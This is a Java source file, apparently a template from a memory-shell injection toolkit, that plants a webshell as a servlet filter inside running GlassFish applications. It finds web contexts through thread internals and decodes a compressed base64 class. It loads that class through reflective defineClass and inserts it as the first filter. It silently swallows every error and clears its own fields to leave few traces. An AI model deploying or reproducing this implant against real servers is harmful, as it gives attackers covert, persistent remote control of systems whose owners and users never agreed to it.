package org.leo.jmg.mem.injectortpl.glassfish;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author pen4uin, ReaJason
 */
public class GlassFishFilterInjector {
    
    private static boolean ok = false;

    private static String shellClassName;
    private static String shellClass;
    private static String urlPattern;

    public GlassFishFilterInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
        
        }
        if (contexts == null || contexts.isEmpty()) {
           
        } else {
            for (Object context : contexts) {
                try {
                   
                    Object shell = getShell(context);
                    inject(context, shell);
                   
                } catch (Throwable e) {
                   
                }
            }
        }
        ok = true;
        shellClass = null;
        shellClassName = null;
        urlPattern = null;
    }


    /**
     * com.sun.enterprise.web.WebModule
     * /xxx/modules/web-glue.jar
     */
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread.getName().contains("ContainerBackgroundProcessor")) {
                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                for (Object value : childrenMap.values()) {
                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                    contexts.addAll(children.values());
                }
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
        }
    }

    
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(shellClassName);
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        return clazz.newInstance();
    }

    
    public void inject(Object context, Object shell) throws Exception {
        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{shellClassName}) != null) {
            return;
        }
        Object filterDef;
        Object filterMap;
        Class<?> filterMapClass;
        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        try {
            // tomcat v8+
            filterDef = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            filterMapClass = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterMap");
            filterMap = filterMapClass.newInstance();
        } catch (Exception e2) {
            // tomcat v5+
            filterDef = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterDef").newInstance();
            filterMapClass = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterMap");
            filterMap = filterMapClass.newInstance();
        }

        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{shellClassName});
        try {
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{shellClassName});
        } catch (Exception e) {
            invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{shell.getClass()});
        }
        invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{shellClassName});
        try {
            invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{urlPattern});
        } catch (Exception e) {
            // tomcat v5
            invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{urlPattern});
        }

        // addFilterMapFirst
        List filterMaps = (List) invokeMethod(context, "findFilterMaps", null, null);
        filterMaps.add(0, filterMap);

        Constructor filterConfigConstructor;
        filterConfigConstructor = contextClassLoader.loadClass("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
        filterConfigConstructor.setAccessible(true);
        Object filterConfig = filterConfigConstructor.newInstance(context, filterDef);
        Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
        filterConfigs.put(shellClassName, filterConfig);
    }
    

    
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    
    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }


    
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        try {
            Field field = getField(obj, name);
            field.setAccessible(true);
            return field.get(obj);
        } catch (NoSuchFieldException ignored) {
        }
        return null;
    }


}
